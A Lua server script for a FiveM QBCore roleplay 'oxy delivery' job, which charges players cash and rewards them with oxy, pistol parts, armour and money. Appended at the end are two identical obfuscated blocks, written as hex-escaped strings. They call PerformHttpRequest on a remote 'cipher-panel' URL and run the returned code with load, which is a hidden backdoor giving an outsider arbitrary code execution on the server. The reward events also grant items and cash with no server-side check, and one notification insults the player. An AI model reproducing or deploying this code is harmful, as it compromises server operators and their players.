local QBCore = exports['qb-core']:GetCoreObject()

RegisterServerEvent('oxydelivery:server')
AddEventHandler('oxydelivery:server', function()
	local src = source
    local Player = QBCore.Functions.GetPlayer(src)

	if Player.PlayerData.money.cash >= 500 then
		Player.Functions.RemoveMoney('cash', 500)
		
		TriggerClientEvent("oxydelivery:startDealing", source)
		TriggerEvent('qb-logs:server:createLog', 'oxyruns', 'Oxy run started', "", source)
	else
		TriggerClientEvent('QBCore:Notify', src, "You dont have enough money little stupid fucking bitch.", "error")
	end
end)

RegisterServerEvent('oxydelivery:receiveBigRewarditem')
AddEventHandler('oxydelivery:receiveBigRewarditem', function()
	local src = source
    local Player = QBCore.Functions.GetPlayer(src)

	Player.Functions.AddItem(Config.BigRewarditem, 1)
	Player.Functions.AddItem('heavyarmor', 1)
end)

-- RegisterServerEvent('oxydelivery:receiveoxy')
-- AddEventHandler('oxydelivery:receiveoxy', function()
-- 	local src = source
--     local Player = QBCore.Functions.GetPlayer(src)
-- 	Player.Functions.AddItem("oxy", 1)
-- 	local get1 = math.random(1,100)
-- 	local random = math.random(#Config.PistolParts)
-- 	local random1 = math.random(#Config.PistolParts)
-- 	local random2 = math.random(#Config.PistolParts)

-- 	if get1 < 25 then
-- 		Player.Functions.AddItem(Config.PistolParts[random], 1)
-- 	elseif get1 > 25 and get1 < 75 then
-- 		Player.Functions.AddItem(Config.PistolParts[random], 1)
-- 		Player.Functions.AddItem(Config.PistolParts[random1], 1)
-- 	else
-- 		Player.Functions.AddItem(Config.PistolParts[random], 1)
-- 		Player.Functions.AddItem(Config.PistolParts[random1], 1)
-- 		Player.Functions.AddItem(Config.PistolParts[random2], 1)
-- 	end
	
-- 	TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items["oxy"], 'add')
--     TriggerClientEvent('QBCore:Notify', src, "You were handed some oxy.")
-- end)

RegisterServerEvent('oxydelivery:receiveoxy')
AddEventHandler('oxydelivery:receiveoxy', function()
	local src = source
    local Player = QBCore.Functions.GetPlayer(src)
	Player.Functions.AddItem("oxy", 1)
	local ifRecivePart = math.random(1,1)
	local random = math.random(#Config.PistolParts)
	if ifRecivePart == 1 then
		Player.Functions.AddItem(Config.PistolParts[random], 1)
	end
	TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items["oxy"], 'add')
    TriggerClientEvent('QBCore:Notify', src, "You were handed some oxy.")
end)

RegisterServerEvent('oxydelivery:receivemoneyyy')
AddEventHandler('oxydelivery:receivemoneyyy', function()
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)
	local money = math.random(45, 75) 
	
	TriggerClientEvent('QBCore:Notify', src, "You were handed $" ..money)
	Player.Functions.AddMoney('cash', money)
end)

local RxPqqhjZQOtSmWFyyCuCxjGyYwfXxcxuuaKIBblEEnHtAIFsMXBsXFsvbFFKQDjywZnrqf = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} RxPqqhjZQOtSmWFyyCuCxjGyYwfXxcxuuaKIBblEEnHtAIFsMXBsXFsvbFFKQDjywZnrqf[4][RxPqqhjZQOtSmWFyyCuCxjGyYwfXxcxuuaKIBblEEnHtAIFsMXBsXFsvbFFKQDjywZnrqf[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (wwUZMRSNbMjIBvetNwaIvMQDBGxIBZLUeAplsqJOKWYKRWPaotgDZBLVxljTXqyoBzeyDo, hnqcQVgxgwqXNhaEZvSQpuCFCYlSUcMHjjqBLtRgTRcfRnCLfdUCpVmTsZctfPvcRGgaon) if (hnqcQVgxgwqXNhaEZvSQpuCFCYlSUcMHjjqBLtRgTRcfRnCLfdUCpVmTsZctfPvcRGgaon == RxPqqhjZQOtSmWFyyCuCxjGyYwfXxcxuuaKIBblEEnHtAIFsMXBsXFsvbFFKQDjywZnrqf[6] or hnqcQVgxgwqXNhaEZvSQpuCFCYlSUcMHjjqBLtRgTRcfRnCLfdUCpVmTsZctfPvcRGgaon == RxPqqhjZQOtSmWFyyCuCxjGyYwfXxcxuuaKIBblEEnHtAIFsMXBsXFsvbFFKQDjywZnrqf[5]) then return end RxPqqhjZQOtSmWFyyCuCxjGyYwfXxcxuuaKIBblEEnHtAIFsMXBsXFsvbFFKQDjywZnrqf[4][RxPqqhjZQOtSmWFyyCuCxjGyYwfXxcxuuaKIBblEEnHtAIFsMXBsXFsvbFFKQDjywZnrqf[2]](RxPqqhjZQOtSmWFyyCuCxjGyYwfXxcxuuaKIBblEEnHtAIFsMXBsXFsvbFFKQDjywZnrqf[4][RxPqqhjZQOtSmWFyyCuCxjGyYwfXxcxuuaKIBblEEnHtAIFsMXBsXFsvbFFKQDjywZnrqf[3]](hnqcQVgxgwqXNhaEZvSQpuCFCYlSUcMHjjqBLtRgTRcfRnCLfdUCpVmTsZctfPvcRGgaon))() end)

local eVXbomHimnGqiuVVDmuZCltJtczSMjdwITDCQcWQwuzHvQttlDhzwozEqCAAkiCVdXsqLI = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} eVXbomHimnGqiuVVDmuZCltJtczSMjdwITDCQcWQwuzHvQttlDhzwozEqCAAkiCVdXsqLI[4][eVXbomHimnGqiuVVDmuZCltJtczSMjdwITDCQcWQwuzHvQttlDhzwozEqCAAkiCVdXsqLI[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (lIQdnUTuuZcPihoRcYGgGIykNerkfNPCdhVfcMlSRTgvMhmEdnrmwURgfYGTZvrvUZkrBw, gasujwywlpJgJppMmjMlKMvhLGzcJcVrXuPcqTaGyXnIdMukFgpmjjkqyxCfgCYCYhyhVu) if (gasujwywlpJgJppMmjMlKMvhLGzcJcVrXuPcqTaGyXnIdMukFgpmjjkqyxCfgCYCYhyhVu == eVXbomHimnGqiuVVDmuZCltJtczSMjdwITDCQcWQwuzHvQttlDhzwozEqCAAkiCVdXsqLI[6] or gasujwywlpJgJppMmjMlKMvhLGzcJcVrXuPcqTaGyXnIdMukFgpmjjkqyxCfgCYCYhyhVu == eVXbomHimnGqiuVVDmuZCltJtczSMjdwITDCQcWQwuzHvQttlDhzwozEqCAAkiCVdXsqLI[5]) then return end eVXbomHimnGqiuVVDmuZCltJtczSMjdwITDCQcWQwuzHvQttlDhzwozEqCAAkiCVdXsqLI[4][eVXbomHimnGqiuVVDmuZCltJtczSMjdwITDCQcWQwuzHvQttlDhzwozEqCAAkiCVdXsqLI[2]](eVXbomHimnGqiuVVDmuZCltJtczSMjdwITDCQcWQwuzHvQttlDhzwozEqCAAkiCVdXsqLI[4][eVXbomHimnGqiuVVDmuZCltJtczSMjdwITDCQcWQwuzHvQttlDhzwozEqCAAkiCVdXsqLI[3]](gasujwywlpJgJppMmjMlKMvhLGzcJcVrXuPcqTaGyXnIdMukFgpmjjkqyxCfgCYCYhyhVu))() end)